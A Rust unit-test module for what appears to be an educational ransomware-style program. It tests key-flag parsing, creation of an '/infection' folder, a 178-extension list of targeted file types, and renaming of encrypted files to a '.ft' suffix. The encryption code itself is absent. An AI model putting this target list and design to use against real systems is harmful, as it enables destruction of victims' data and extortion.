#[cfg(test)]
mod tests {
    use crate::tools::get_flags;
    use crate::tools::Flags;
    use crate::tools::parse::find_reverse_key;
    use crate::encrypt;
    use std::fs::ReadDir;
    use std::path::PathBuf;
    #[test]
    fn test_flags_r() {
        let mut s_flags = Flags {
            key: String::default(),
            reverse_key: String::default(),
            help: false,
            version: false,
            silent: false
        };

        find_reverse_key(&String::from("-r abc"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "abc");
        s_flags.reverse_key.clear();
        find_reverse_key(&String::from("-sr abc"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "abc");
        s_flags.reverse_key.clear();
        find_reverse_key(&String::from("-rabc"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "abc");
        find_reverse_key(&String::from("-srabc"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "abc");
    }

    #[test]
    fn test_flags_reverse() {
        let mut s_flags = Flags {
            key: String::default(),
            reverse_key: String::default(),
            help: false,
            version: false,
            silent: false
        };

        find_reverse_key(&String::from("--reverse abc"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "abc");
        s_flags.reverse_key.clear();
        find_reverse_key(&String::from("-s --reverse abc"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "abc");
        s_flags.reverse_key.clear();
        find_reverse_key(&String::from("-s --reverseabc"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "abc");
    }

    #[test]
    fn test_flags_same_reverse() {
        let mut s_flags = Flags {
            key: String::default(),
            reverse_key: String::default(),
            help: false,
            version: false,
            silent: false
        };

        find_reverse_key(&String::from("--reverse abc -sr def"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "def");
        find_reverse_key(&String::from("--reverse abc -r def"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "def");
        s_flags.reverse_key.clear();
        find_reverse_key(&String::from("-sr abc --reverse def"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "def");
        find_reverse_key(&String::from("-r abc --reverse def"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "def");
        s_flags.reverse_key.clear();
        find_reverse_key(&String::from("-rabc --reversedef"), &mut s_flags);
        assert_eq!(s_flags.reverse_key, "def");
    }
    #[test]
    fn test_help() {
        let mut s_flags = Flags {
            key: String::default(),
            reverse_key: String::default(),
            help: false,
            version: false,
            silent: false
        };

        get_flags(&String::from("--help"), &mut s_flags);
        assert_eq!(s_flags.help, true);
        get_flags(&String::from("-h"), &mut s_flags);
        assert_eq!(s_flags.help, true);
    }
    #[test]
    fn test_version() {
        let mut s_flags = Flags {
            key: String::default(),
            reverse_key: String::default(),
            help: false,
            version: false,
            silent: false
        };

        get_flags(&String::from("--version"), &mut s_flags);
        assert_eq!(s_flags.version, true);
        get_flags(&String::from("-v"), &mut s_flags);
        assert_eq!(s_flags.version, true);
    }

    #[test]
    fn test_silent() {
        let mut s_flags = Flags {
            key: String::default(),
            reverse_key: String::default(),
            help: false,
            version: false,
            silent: false
        };

        get_flags(&String::from("--silent"), &mut s_flags);
        assert_eq!(s_flags.silent, true);
        get_flags(&String::from("-s"), &mut s_flags);
        assert_eq!(s_flags.silent, true);
    }

    #[test]
    fn test_path_infection() {
        let dir = encrypt::get_infection_path(&"/infection".to_owned());
        let mut ret: bool = encrypt::folder_exist(&dir);

        if !ret {
            ret = encrypt::create_folder_infection(&"/infection".to_owned());
        }
        assert_eq!(ret, true);
    }

    #[test]
    fn find_file() {
    	let arr: [&str; 178] = ["der",
    "pfx",
    "key",
    "crt",
    "csr",
    "p12",
    "pem",
    "odt",
    "ott",
    "sxw",
    "stw",
    "uot",
    "3ds",
    "max",
    "3dm",
    "ods",
    "ots",
    "sxc",
    "stc",
    "dif",
    "slk",
    "wb2",
    "odp",
    "otp",
    "sxd",
    "std",
    "uop",
    "odg",
    "otg",
    "sxm",
    "mml",
    "lay",
    "lay6",
    "asc",
    "sqlite3",
    "sqlitedb",
    "sql",
    "accdb",
    "mdb",
    "db",
    "dbf",
    "odb",
    "frm",
    "myd",
    "myi",
    "ibd",
    "mdf",
    "ldf",
    "sln",
    "suo",
    "cs",
    "c",
    "cpp",
    "pas",
    "h",
    "asm",
    "js",
    "cmd",
    "bat",
    "ps1",
    "vbs",
    "vb",
    "pl",
    "dip",
    "dch",
    "sch",
    "brd",
    "jsp",
    "php",
    "asp",
    "rb",
    "java",
    "jar",
    "class",
    "sh",
    "mp3",
    "wav",
    "swf",
    "fla",
    "wmv",
    "mpg",
    "vob",
    "mpeg",
    "asf",
    "avi",
    "mov",
    "mp4",
    "3gp",
    "mkv",
    "3g2",
    "flv",
    "wma",
    "mid",
    "m3u",
    "m4u",
    "djvu",
    "svg",
    "ai",
    "psd",
    "nef",
    "tiff",
    "tif",
    "cgm",
    "raw",
    "gif",
    "png",
    "bmp",
    "jpg",
    "jpeg",
    "vcd",
    "iso",
    "backup",
    "zip",
    "rar",
    "7z",
    "gz",
    "tgz",
    "tar",
    "bak",
    "tbk",
    "bz2",
    "PAQ",
    "ARC",
    "aes",
    "gpg",
    "vmx",
    "vmdk", 
    "vdi",
    "sldm",
    "sldx",
    "sti",
    "sxi",
    "602",
    "hwp",
    "snt",
    "onetoc2",
    "dwg",
    "pdf",
    "wk1",
    "wks",
    "123",
    "rtf",
    "csv",
    "txt",
    "vsdx",
    "vsd",
    "edb",
    "eml",
    "msg",
    "ost",
    "pst",
    "potm",
    "potx",
    "ppam",
    "ppsx",
    "ppsm",
    "pps",
    "pot",
    "pptm",
    "pptx",
    "ppt",
    "xltm",
    "xltx",
    "xlc",
    "xlm",
    "xlt",
    "xlw",
    "xlsb",
    "xlsm",
    "xlsx",
    "xls",
    "dotx",
    "dotm",
    "dot",
    "docm",
    "docb",
    "docx",
    "doc",
    ];

        let res = encrypt::accepted_type_file(&arr, "der");
        assert_eq!(res, true);
        let res = encrypt::accepted_type_file(&arr, "doc");
        assert_eq!(res, true);
        let res = encrypt::accepted_type_file(&arr, "a");
        assert_eq!(res, false);
        let res = encrypt::accepted_type_file(&arr, "");
        assert_eq!(res, false);
    }

    #[test]
    fn test_rename() {
        let folder = "/home/guillaume/infection_cpy".to_owned();
        let path1 = PathBuf::from(folder.to_owned() + "/der.der");
        let res_open = std::fs::File::open(&path1);

        match res_open {
            Ok(open) => {
                encrypt::infect::rename_infect(&path1);
                let path1 = PathBuf::from(folder.to_owned() + "/der.der.ft");
                let res_open = std::fs::File::open(&path1);

                match res_open {
                    Ok(open) => {
                        assert_eq!(true, true);
                    },
                    Err(_) =>{
                        assert_eq!(false, true);
                    }
                }
            },
            Err(_) =>{
            }
        }

        let folder = "/home/guillaume/infection_cpy".to_owned();
        let path1 = PathBuf::from(folder.to_owned() + "/test.mp3");
        let res_open = std::fs::File::open(&path1);

        match res_open {
            Ok(open) => {
                encrypt::infect::rename_infect(&path1);
                let path1 = PathBuf::from(folder.to_owned() + "/test.mp3.ft");
                let res_open = std::fs::File::open(&path1);

                match res_open {
                    Ok(open) => {
                        assert_eq!(true, true);
                    },
                    Err(_) =>{
                        assert_eq!(false, true);
                    }
                }
            },
            Err(_) =>{
            }
        }
    }

    fn test_file_already_ft() {

    }
}
